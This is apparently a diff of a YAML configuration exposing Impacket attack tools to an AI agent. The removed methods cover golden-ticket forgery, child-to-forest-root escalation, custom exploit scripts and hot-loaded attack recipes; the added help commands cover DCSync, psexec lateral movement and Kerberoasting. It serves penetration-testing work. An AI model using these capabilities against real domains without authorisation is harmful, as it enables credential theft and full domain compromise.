-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      command:
-        type: string
-        description: "Command to execute via PSEXEC after ticket forgery (default: cmd.exe, 'None' to skip)"
-      write_ticket:
-        type: string
-        description: "Save the forged golden ticket to this ccache file path"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-
-  raise_child:
-    required_ports: [88, 389, 445]
-    description: "Privilege escalation from a child domain to the forest root. Exploits trust relationships to create an Enterprise Admin golden ticket."
-    when_to_use: "After gaining Domain Admin in a child domain. Escalates to Enterprise Admin by exploiting forest trust to forge a cross-domain golden ticket."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Domain Controller IP or hostname"
-      username:
-        type: string
-        description: "Username for authentication (Domain Admin in child domain)"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Child domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      target_exec:
-        type: string
-        description: "Target host to PSEXEC into after escalation"
-      target_rid:
-        type: integer
-        description: "Target user RID to dump credentials for (default: 500 = Administrator)"
-      write_ticket:
-        type: string
-        description: "Save the golden ticket to this ccache file path"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-
-  # ── Custom Scripts ─────────────────────────────────────────────────────
-
-  run_custom:
-    required_ports: []
-    description: "Execute a custom Python script using the Impacket library. Scripts should be placed in /session/impacket-scripts/. Has access to all Impacket modules."
-    when_to_use: "When no existing method covers your use case. Write a custom Python script using Impacket's library and execute it. Good for novel exploits, custom enumeration, or chaining multiple Impacket operations."
-    params:
-      script:
-        type: string
-        required: true
-        description: "Script filename (e.g., 'my_exploit.py') or full path in /session/impacket-scripts/"
-      args:
-        type: string
-        description: "Command-line arguments to pass to the script"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-
-recipe_schema:
-  description: |
-    The impacket MCP server supports dynamic recipes. To add a new impacket
-    method during an engagement, write a Python file to /session/recipes/impacket/
-    following this format. The method will be available immediately.
-  format: |
-    RECIPE = {
-        "name": "method_name",           # required: MCP method name
-        "description": "What it does",   # required: for agent understanding
-        "auth": "domain",                # required: "domain", "target", or "none"
-        "binary": "impacket-toolname",   # use for installed impacket binaries
-        # OR
-        "script": "/session/impacket-scripts/custom.py",  # use for custom scripts
-        "params": {                      # tool-specific params (auth params added automatically)
-            "param_name": {
-                "type": "string",        # string, integer, boolean
-                "required": True,
-                "description": "What this param does"
-            }
-        }
-    }
-  location: /session/recipes/impacket/
-  auth_styles:
-    domain: "Builds domain/user:pass + -dc-ip (for AD tools like dacledit, owneredit)"
-    target: "Builds domain/user:pass@target (for remote exec tools like psexec)"
-    none: "No auth args built (for offline tools like describeTicket)"
-  notes:
-    - Auth params (target, username, password, domain, hashes, kerberos, dc_ip, aes_key, ccache_path) are added automatically based on auth style
-    - extra_args param is added automatically to every recipe method
-    - Recipes are hot-reloaded on every tool call
-    - Recipes cannot overwrite built-in methods
-    - Bad recipes are logged and skipped
+help_commands:
+  - command: "impacket-secretsdump --help"
+    purpose: "DCSync / local secrets dump options"
+  - command: "impacket-psexec --help"
+    purpose: "psexec lateral movement options"
+  - command: "impacket-GetUserSPNs --help"
+    purpose: "Kerberoast options (note camelCase)"
+  - command: "impacket-GetNPUsers --help"
+    purpose: "AS-REP roast options (note camelCase)"
+  - command: "impacket-getTGT --help"
+    purpose: "TGT request options for Kerberos auth chain"
+  - command: "impacket-getST --help"
+    purpose: "Service ticket options including S4U2Self/Proxy"
+  - command: "ls /usr/bin/impacket-*"
+    purpose: "List ALL 47 sub-binaries on PATH (run inside container)"
